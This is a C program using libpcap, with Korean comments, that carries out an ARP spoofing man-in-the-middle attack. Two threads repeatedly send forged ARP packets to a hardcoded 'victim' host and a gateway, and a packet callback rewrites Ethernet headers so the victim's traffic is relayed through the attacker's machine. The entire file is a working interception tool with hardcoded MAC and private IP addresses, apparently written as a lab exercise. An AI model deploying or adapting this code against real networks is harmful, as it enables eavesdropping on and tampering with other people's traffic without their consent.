#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>

#define BUF_SIZE 100
#define SNAPLEN 1024

/*
== 하드코딩인 부분 수정 예정 ==
#define MAC_LEN 6
#define VICTIM "40:8d:5c:69:2e:7a"
#define GATEWAY "10:0e:7e:2a:48:01"
#define ATTACK "00:0c:29:05:6d:a8"
#define GATEWAY "\x0A\x64\x72\x01"
*/

//전역변수로 생성
pcap_t *use_dev;

// 첫번째 Thread VICTIM 담당
void *Arp_send_VICTIM(void *arg)
{

    unsigned char packet[100]={0,};
        packet[0] = 0x40;
        packet[1] = 0x8d;
        packet[2] = 0x5c;
        packet[3] = 0x69;
        packet[4] = 0x2e;
        packet[5] = 0x7a;


        packet[6] = 0x00;
        packet[7] = 0x0c;
        packet[8] = 0x29;
        packet[9] = 0x05;
        packet[10] = 0x6d;
        packet[11] = 0xa8;

        //ether_type (ARP로 설정)
        packet[12] = 0x08;
        packet[13] = 0x06;

        //hrd_type (Ethernet로 설정)
        packet[14] = 0x00;
        packet[15] = 0x01;

        //proto_type (IPv4 로 설정)
        packet[16] = 0x08;
        packet[17] = 0x00;

        //hrd_size (6)
        packet[18] = 0x06;
        //proto_size (4)
        packet[19] = 0x04;

        //Opcode (request)
        packet[20] = 0x00;
        packet[21] = 0x01;

        // Sender MAC (My mac)
        packet[22] = 0x00;
        packet[23] = 0x0c;
        packet[24] = 0x29;
        packet[25] = 0x05;
        packet[26] = 0x6d;
        packet[27] = 0xa8;
        //Sender IP (MY ip)
        packet[28] = 10;
        packet[29] = 100;
        packet[30] = 114;
        packet[31] = 1;

        //Target MAC
        packet[32] = 0x40;
        packet[33] = 0x8d;
        packet[34] = 0x5c;
        packet[35] = 0x69;
        packet[36] = 0x2e;
        packet[37] = 0x7a;
        //Target IP
        packet[38] = 10;
        packet[39] = 100;
        packet[40] = 114;
        packet[41] = 253;

        while(1)
        {
            if(pcap_sendpacket(use_dev,packet,42)!=0)
            {
                printf("SEND PACKET ERROR!\n");
                pthread_exit(NULL);
            }
            printf("VICTIM_ARP\n");
            sleep(1);
        }
    pthread_exit(NULL);

}

//두번째 Thread GATEWAY 담당
void *Arp_send_GATEWAY(void *arg)
{
    unsigned char packet[100]={0,};
        packet[0] = 0x10;
        packet[1] = 0x0e;
        packet[2] = 0x7e;
        packet[3] = 0x2a;
        packet[4] = 0x48;
        packet[5] = 0x01;


        packet[6] = 0x00;
        packet[7] = 0x0c;
        packet[8] = 0x29;
        packet[9] = 0x05;
        packet[10] = 0x6d;
        packet[11] = 0xa8;

        //ether_type (ARP로 설정)
        packet[12] = 0x08;
        packet[13] = 0x06;

        //hrd_type (Ethernet로 설정)
        packet[14] = 0x00;
        packet[15] = 0x01;

        //proto_type (IPv4 로 설정)
        packet[16] = 0x08;
        packet[17] = 0x00;

        //hrd_size (6)
        packet[18] = 0x06;
        //proto_size (4)
        packet[19] = 0x04;

        //Opcode (request)
        packet[20] = 0x00;
        packet[21] = 0x01;

        // Sender MAC (My mac)
        packet[22] = 0x00;
        packet[23] = 0x0c;
        packet[24] = 0x29;
        packet[25] = 0x05;
        packet[26] = 0x6d;
        packet[27] = 0xa8;
        //Sender IP (MY ip)
        packet[28] = 10;
        packet[29] = 100;
        packet[30] = 114;
        packet[31] = 253;

        //Target MAC
        packet[32] = 0x10;
        packet[33] = 0x0e;
        packet[34] = 0x7e;
        packet[35] = 0x2a;
        packet[36] = 0x48;
        packet[37] = 0x01;
        //Target IP
        packet[38] = 10;
        packet[39] = 100;
        packet[40] = 114;
        packet[41] = 1;

        while(1)
        {
            if(pcap_sendpacket(use_dev,packet,42)!=0)
            {
                printf("SEND PACKET ERROR!\n");
                pthread_exit(NULL);
            }
            printf("GATEWAY_ARP\n");
            sleep(1);
        }
    pthread_exit(NULL);
}

//Thread 생성하는 함수
void Thread_up()
{
    pthread_t threads[2];
    if((pthread_create(&threads[0],NULL,&Arp_send_VICTIM,NULL))!=0)
    {
        printf("ERROR\n");
    }
    if((pthread_create(&threads[1],NULL,&Arp_send_GATEWAY,NULL))!=0)
    {
        printf("ERROR\n");
    }
}

//장치 설정하는 함수
void init_dev(char **dev)
{
    char errbuf[PCAP_ERRBUF_SIZE];

    *dev = pcap_lookupdev(errbuf);

    if(dev == NULL)
    {
        printf("%s\n",errbuf);
        exit(1);
    }
    use_dev = pcap_open_live(*dev, BUFSIZ, 1, 1,errbuf);

    if(use_dev == NULL)
    {
        printf("%s\n",errbuf);
        exit(1);
    }

    return;
}

//필터룰 설정하는 함수
void set_filter(char *filter, char *victim_ip)
{
    struct bpf_program fp;

    printf("SET FILTERING...\n");
    strcat(filter,"host ");
    strcat(filter,victim_ip);
    printf("SET FILTER :: %s\n",filter);

    if(pcap_compile(use_dev,&fp,filter,SNAPLEN,1)<0)
    {
        printf("COMPILE ERROR!\n");
        exit(1);
    }
    if(pcap_setfilter(use_dev,&fp)<0)
    {
        printf("SETFILET ERROR!\n");
        exit(1);
    }
    return;
}
//loop함수-callback함수(패킷 릴레이처리해주는 부분)
void callback(unsigned char *param,const struct pcap_pkthdr *header,const unsigned char *pkt_data)
{
    struct ether_header *eh = (struct ether_header *)pkt_data;
    printf("Callbakc :: In\n");

    unsigned char VICTIM_MAC[6] = {0x40,0x8d,0x5c,0x69,0x2e,0x7a};
    unsigned char ATTACK_MAC[6] = {0x00,0x0c,0x29,0x05,0x6d,0xa8};
    unsigned char GATEWAY_MAC[6] = {0x10,0x0e,0x7e,0x2a,0x48,0x01};
    if((memcmp(VICTIM_MAC,eh->ether_shost,sizeof(eh->ether_shost)))==0)
    {
        printf("VICTIM -> GATEWAY\n");
        memcpy(eh->ether_shost,ATTACK_MAC,sizeof(eh->ether_shost));
        memcpy(eh->ether_dhost,GATEWAY_MAC,sizeof(eh->ether_dhost));
    }
    if((memcmp(GATEWAY_MAC,eh->ether_shost,sizeof(eh->ether_shost)))==0)
    {
        printf("GATEWAY -> VICTIM\n");
        memcpy(eh->ether_shost,ATTACK_MAC,sizeof(eh->ether_shost));
        memcpy(eh->ether_dhost,VICTIM_MAC,sizeof(eh->ether_dhost));
    }

    pcap_sendpacket(use_dev,pkt_data,header->caplen);
}

int main(int argc, char **argv)
{
    char *dev;
    char filter[BUF_SIZE]={0,};
    char victim_ip[BUF_SIZE]={0,};

    //인자값으로 VICTIM_IP 받음
    if(argv[1])
    {
        strcpy(victim_ip,argv[1]);
    }
    else
    {
        printf("Please enter the Victim_IP\n");
        return 1;
    }
    //디바이스 설정
    init_dev(&dev);
    //필터 설정
    set_filter(filter,victim_ip);
    //Thread 생성
    Thread_up();
    // Packet Start
    pcap_loop(use_dev,0,callback,NULL);
    pcap_close(use_dev);

    return 0;

}
